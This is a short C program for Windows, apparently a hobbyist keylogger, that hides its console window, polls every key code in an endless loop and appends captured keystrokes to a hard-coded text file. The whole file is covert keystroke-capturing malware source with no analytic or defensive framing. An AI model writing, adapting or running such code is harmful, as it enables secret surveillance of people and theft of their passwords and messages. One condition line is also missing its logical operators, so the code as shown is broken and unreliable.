#include <windows.h>
#include <stdio.h>

FILE *file;

void logkeystroke(int key) {
    if (key == VK_SHIFT  key == VK_CONTROL  key == VK_MENU) {
        return;
    }

    file = fopen("C:\\Users\\PC\\Documents\\C programms\\keyloggerTestl\\keylog.txt", "a+");

    if ((key >= 65 && key <= 90) && !(GetAsyncKeyState(VK_SHIFT))) {
        key += 32;
    }

    fputc(key, file);
    fclose(file);
}

int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    while (1) {
        for (int key = 0x01; key <= 0xFB; key++) {
            if (GetAsyncKeyState(key) & 0x0001) {
                logkeystroke(key);
            }
        }
    }

    return 0;
}
